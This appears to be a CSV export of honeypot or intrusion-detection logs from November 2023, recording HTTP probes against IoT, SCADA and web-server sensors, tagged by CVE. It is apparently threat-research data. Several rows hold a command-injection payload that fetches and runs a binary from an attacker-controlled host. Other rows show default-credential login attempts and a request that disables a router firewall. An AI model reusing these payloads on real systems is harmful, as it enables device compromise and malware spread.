local_ip,remote_ip,remote_port,local_port,tag_label,attack_time,target_profile,node_id,ASN,attack_data,method,path,User-Agent,Accept-Encoding,Accept,Qualys-Scan,Content-Length,Content-Type,Referrer,Host,body
112.133.238.173,152.32.213.68,41888,80,CVE-2017-6884,2023-11-02T08:09:13,device:scada:plc:Delta_Electronics,317,AS135377,"{'method': 'GET', 'path': '/cgi-bin/luci/sitemap.xml', 'headers': {'Host': '112.133.238.173', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/562.36 (KHTML, like Gecko) Chrome/63.0.1574 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': '*', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/cgi-bin/luci/sitemap.xml,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/562.36 (KHTML, like Gecko) Chrome/63.0.1574 Safari/537.36",gzip,"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",,,,,112.133.238.173,
117.193.125.90,45.128.232.152,54328,8080,CID-1193,2023-11-02T07:16:24,device:web:server:Apache,186,AS202685,"{'method': 'CONNECT', 'path': 'google.com:443', 'headers': {'Host': 'google.com:443', 'User-Agent': 'Go-http-client/1.1'}}",CONNECT,google.com:443,Go-http-client/1.1,,,,,,,google.com:443,
172.16.1.4,89.190.156.170,42446,8080,CVE-2023-26801,2023-11-02T07:56:26,device:web:server:Apache,360,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '61.1.174.165:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,61.1.174.165:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
192.168.66.2,83.97.73.87,35204,80,PhpXdebug_extension_scan,2023-11-02T09:08:50,device:scada:plc:Delta_Electronics,451,AS208312,"{'method': 'GET', 'path': '/?XDEBUG_SESSION_START=phpstorm', 'headers': {'Host': '117.251.201.91:80', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/?XDEBUG_SESSION_START=phpstorm,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",gzip,,,,,,117.251.201.91:80,
203.197.127.113,84.54.51.118,55788,80,Unsecured_ENV_file_scan,2023-11-02T08:59:43,device:iot:IPCamera:Panasonic,125,AS202685,"{'method': 'GET', 'path': '/.env', 'headers': {'Host': '203.197.127.113', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15', 'Accept-Encoding': 'gzip'}}",GET,/.env,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/605.1.15",gzip,,,,,,203.197.127.113,
61.1.122.251,89.190.156.170,36932,8080,CVE-2023-26801,2023-11-02T08:05:13,device:web:server:Apache,56,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '61.1.122.251:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,61.1.122.251:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
10.2.2.38,50.116.21.8,47958,80,CID-1159,2023-11-02T09:06:51,device:iot:Router:Cisco,384,AS63949,"{'method': 'GET', 'path': '/api/sonicos/tfa', 'headers': {'Host': '103.153.88.247:80', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/api/sonicos/tfa,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",gzip,,,,,,103.153.88.247:80,
112.133.238.173,152.32.213.68,49246,80,CVE-2017-6884,2023-11-02T08:09:21,device:scada:plc:Delta_Electronics,317,AS135377,"{'method': 'GET', 'path': '/cgi-bin/luci/sitemap.xml', 'headers': {'Host': '112.133.238.173', 'User-Agent': 'Mozilla/5.0 (Windows NT 7_2; Win64; x64) AppleWebKit/556.40 (KHTML, like Gecko) Chrome/62.0.1179 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': '*', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/cgi-bin/luci/sitemap.xml,"Mozilla/5.0 (Windows NT 7_2; Win64; x64) AppleWebKit/556.40 (KHTML, like Gecko) Chrome/62.0.1179 Safari/537.36",gzip,"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",,,,,112.133.238.173,
192.168.66.2,109.237.97.180,58498,80,CID-1015,2023-11-02T08:47:48,device:scada:plc:Delta_Electronics,451,AS202306,"{'method': 'GET', 'path': '/info.php', 'headers': {'Host': '117.251.201.91', 'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/info.php,,"gzip, deflate",*/*,,,,,117.251.201.91,
122.186.199.77,83.97.73.87,57140,80,PhpXdebug_extension_scan,2023-11-02T09:02:54,device:iot:Printer:Canon,374,AS208312,"{'method': 'GET', 'path': '/?XDEBUG_SESSION_START=phpstorm', 'headers': {'Host': '122.186.199.77:80', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/?XDEBUG_SESSION_START=phpstorm,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",gzip,,,,,,122.186.199.77:80,
223.31.122.236,167.71.248.166,58306,80,CVE-2017-6884,2023-11-02T09:55:20,device:scada:plc:Delta_Electronics,154,AS14061,"{'method': 'GET', 'path': '/cgi-bin/luci', 'headers': {'Host': '223.31.122.236', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', 'Accept': '*/*', 'Connection': 'keep-alive', 'Referer': 'http://223.31.122.236/cgi-bin/luci', 'Accept-Encoding': 'gzip'}}",GET,/cgi-bin/luci,Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0,gzip,*/*,,,,,223.31.122.236,
103.7.129.120,37.187.215.252,48785,80,CVE-2017-6884,2023-11-02T10:18:54,device:scada:plc:Delta_Electronics,149,AS16276,"{'method': 'GET', 'path': '/cgi-bin/luci', 'headers': {'Host': '103.7.129.120', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5'}}",GET,/cgi-bin/luci,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,,,,103.7.129.120,
59.185.16.110,89.190.156.170,53926,8080,CVE-2023-26801,2023-11-02T10:02:00,device:web:server:Apache,502,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '59.185.16.110:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,59.185.16.110:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
103.7.128.68,45.128.232.152,40530,8080,CID-1193,2023-11-02T10:14:59,device:web:server:Apache,243,AS202685,"{'method': 'CONNECT', 'path': 'google.com:443', 'headers': {'Host': 'google.com:443', 'User-Agent': 'Go-http-client/1.1'}}",CONNECT,google.com:443,Go-http-client/1.1,,,,,,,google.com:443,
172.16.15.13,172.16.15.1,49548,80,CID-1144,2023-11-02T09:08:09,device:iot:IPCamera:Hikvision,407,,"{'method': 'GET', 'path': '/auth1.html', 'headers': {'Host': '117.232.109.86:80', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/auth1.html,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",gzip,,,,,,117.232.109.86:80,
111.235.68.60,84.239.14.188,17925,80,CVE-2017-6884,2023-11-02T10:04:01,device:scada:plc:Delta_Electronics,314,AS44679,"{'method': 'POST', 'path': '/cgi-bin/luci', 'headers': {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'Origin': 'http://111.235.68.60:80', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Referer': 'http://111.235.68.60:80/cgi-bin/luci', 'Accept-Language': 'en-US,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'Cookie': 'bLanguage=en', 'Content-Length': '33'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9MTIzcXdlUVdF'}",POST,/cgi-bin/luci,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",,"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",,33,application/x-www-form-urlencoded,,,username=admin&password=123qweQWE
103.7.128.68,189.136.63.181,60828,8080,CVE-2023-26801,2023-11-02T10:09:23,device:web:server:Apache,243,AS8151,"{'method': 'DELETE', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Cookie': 'user=admin'}}",DELETE,/goform/set_LimitClient_cfg,,,,,,,,,
115.247.192.221,103.180.146.222,36864,80,CID-937,2023-11-02T12:16:05,device:iot:IPCamera:D-Link-DCS-5222L,330,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '115.247.192.221:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 115.247.192.221:80/menu.html', 'Authorization': 'Basic YWRtaW46Y2NpYWRtaW4='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,115.247.192.221:80,
10.96.153.54,103.180.146.222,53692,80,CID-937,2023-11-02T12:17:04,device:iot:IPCamera:CISCO-WebCam,185,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.129.75.229:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.129.75.229:80/menu.html', 'Authorization': 'Basic QWRtaW46QWRtaW4='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.129.75.229:80,
172.16.255.13,103.180.146.222,37068,80,CVE-2020-8958,2023-11-02T12:19:15,device:iot:Printer:HPLaserJet,164,AS140803,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '14.139.123.30:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://14.139.123.30:80', 'Connection': 'keep-alive', 'Referer': 'http://14.139.123.30:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,14.139.123.30:80,username=admin&psd=Feefifofum
10.15.10.2,94.102.49.190,54858,80,security_txt_scan,2023-11-02T10:51:49,device:iot:IPCamera:MotionEye,226,AS202425,"{'method': 'GET', 'path': '/.well-known/security.txt', 'headers': {'Host': '103.94.108.252', 'Accept-Encoding': 'identity'}}",GET,/.well-known/security.txt,,identity,,,,,,103.94.108.252,
61.1.173.123,35.171.47.202,38312,8080,CID-1154,2023-11-02T10:53:43,device:web:server:Apache,269,AS14618,"{'method': 'GET', 'path': '/99vu', 'headers': {'Host': '61.1.173.123:8080', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Connection': 'close', 'Accept-Encoding': 'gzip'}}",GET,/99vu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",gzip,,,,,,61.1.173.123:8080,
192.168.101.21,5.196.102.74,41243,8080,CID-982,2023-11-02T10:56:09,device:web:server:Apache,411,AS16276,"{'method': 'GET', 'path': '/favicon.ico', 'headers': {'Host': '103.112.231.248:8080', 'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5'}}",GET,/favicon.ico,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,,,,103.112.231.248:8080,
61.1.160.93,44.213.77.73,60394,8080,CID-944,2023-11-02T10:57:48,device:web:server:Apache,264,AS14618,"{'method': 'GET', 'path': '/aaaaaaaaaaaaaaaaaaaaaaaaaqr', 'headers': {'Host': '61.1.160.93:8080', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Connection': 'close', 'Accept-Encoding': 'gzip'}}",GET,/aaaaaaaaaaaaaaaaaaaaaaaaaqr,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",gzip,,,,,,61.1.160.93:8080,
61.1.160.93,44.213.77.73,60394,8080,CID-944,2023-11-02T10:57:48,device:web:server:Apache,264,AS14618,"{'method': 'GET', 'path': '/99vt', 'headers': {'Host': '61.1.160.93:8080', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Connection': 'close', 'Accept-Encoding': 'gzip'}}",GET,/99vt,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",gzip,,,,,,61.1.160.93:8080,
14.98.252.174,35.216.250.8,54776,80,CID-1018,2023-11-02T10:41:16,device:iot:IPCamera:Hikvision,419,AS15169,"{'method': 'GET', 'path': '/config.json', 'headers': {'Host': '14.98.252.174', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/config.json,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0 abuse.xmco.fr,gzip,,,,,,14.98.252.174,
172.16.16.39,89.190.156.170,54988,8080,CVE-2023-26801,2023-11-02T12:14:00,device:web:server:Apache,426,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '103.58.121.39:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,103.58.121.39:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
103.122.130.232,83.97.73.87,38534,80,CVE-2022-22947,2023-11-02T10:36:55,device:iot:Router:TP-LINK,77,AS208312,"{'method': 'GET', 'path': '/actuator/gateway/routes', 'headers': {'Host': '103.122.130.232:80', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/actuator/gateway/routes,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",gzip,,,,,,103.122.130.232:80,
103.196.191.142,89.190.156.170,37790,8080,CVE-2023-26801,2023-11-02T11:56:13,device:web:server:Apache,99,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '103.196.191.142:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,103.196.191.142:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
182.75.209.5,185.142.236.40,33346,80,security_txt_scan,2023-11-02T10:58:55,device:iot:Router:Cisco,379,AS174,"{'method': 'GET', 'path': '/.well-known/security.txt', 'headers': {'Host': '182.75.209.5', 'Accept-Encoding': 'identity'}}",GET,/.well-known/security.txt,,identity,,,,,,182.75.209.5,
115.248.239.204,198.74.49.232,40302,80,CID-1150,2023-11-02T12:20:48,device:scada:plc:Delta_Electronics,402,AS63949,"{'method': 'GET', 'path': '/auth1.html', 'headers': {'Host': '115.248.239.204:80', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/auth1.html,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",gzip,,,,,,115.248.239.204:80,
115.248.239.204,198.74.49.232,40302,80,CID-1150,2023-11-02T12:20:48,device:scada:plc:Delta_Electronics,402,AS63949,"{'method': 'GET', 'path': '/sslvpnLogin.html', 'headers': {'Host': '115.248.239.204:80', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/sslvpnLogin.html,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",gzip,,,,,,115.248.239.204:80,
115.247.192.220,141.98.11.52,33706,80,CVE-2018-20334,2023-11-02T10:59:44,device:iot:Router:Mi-Router,330,AS209605,"{'method': 'POST', 'path': '/start_apply.htm', 'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246', 'Referer': 'http://115.247.192.220:80/Main_Analysis_Content.asp', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Content-Length': '324', 'Host': '115.247.192.220:80', 'Authorization': 'Basic YWRtaW46ZzMyMTY3ODkw'}, 'body': b'Y3VycmVudF9wYWdlPUFkdmFuY2VkX0Jhc2ljRmlyZXdhbGxfQ29udGVudC5hc3AmbmV4dF9wYWdlPSZuZXh0X2hvc3Q9MjEyLjc1LjEzOC4yMDYlM0E4MDgwJmdyb3VwX2lkPSZtb2RpZmllZD0wJmFjdGlvbl93YWl0PTUmYWN0aW9uX21vZGU9YXBwbHkmYWN0aW9uX3NjcmlwdD1yZXN0YXJ0X2ZpcmV3YWxsJmZpcnN0X3RpbWU9JnByZWZlcnJlZF9sYW5nPUVOJmZpcm12ZXI9My4wLjAuNCZmd19lbmFibGVfeD0wJmZ3X2Rvc194PTAmbWlzY19waW5nX3g9MCZzdF93ZWJkYXZfbW9kZT0wJndlYmRhdl9odHRwX3BvcnQ9JndlYmRhdl9odHRwc19wb3J0PSZGQVFfaW5wdXQ9'}",POST,/start_apply.htm,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",,"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,324,,,115.247.192.220:80,current_page=Advanced_BasicFirewall_Content.asp&next_page=&next_host=212.75.138.206%3A8080&group_id=&modified=0&action_wait=5&action_mode=apply&action_script=restart_firewall&first_time=&preferred_lang=EN&firmver=3.0.0.4&fw_enable_x=0&fw_dos_x=0&misc_ping_x=0&st_webdav_mode=0&webdav_http_port=&webdav_https_port=&FAQ_input=
223.30.245.180,84.54.51.92,55574,8080,CID-943,2023-11-02T11:53:12,device:web:server:Apache,194,AS202685,"{'method': 'CONNECT', 'path': 'example.com:443', 'headers': {'Host': 'example.com:443', 'User-Agent': 'Go-http-client/1.1'}}",CONNECT,example.com:443,Go-http-client/1.1,,,,,,,example.com:443,
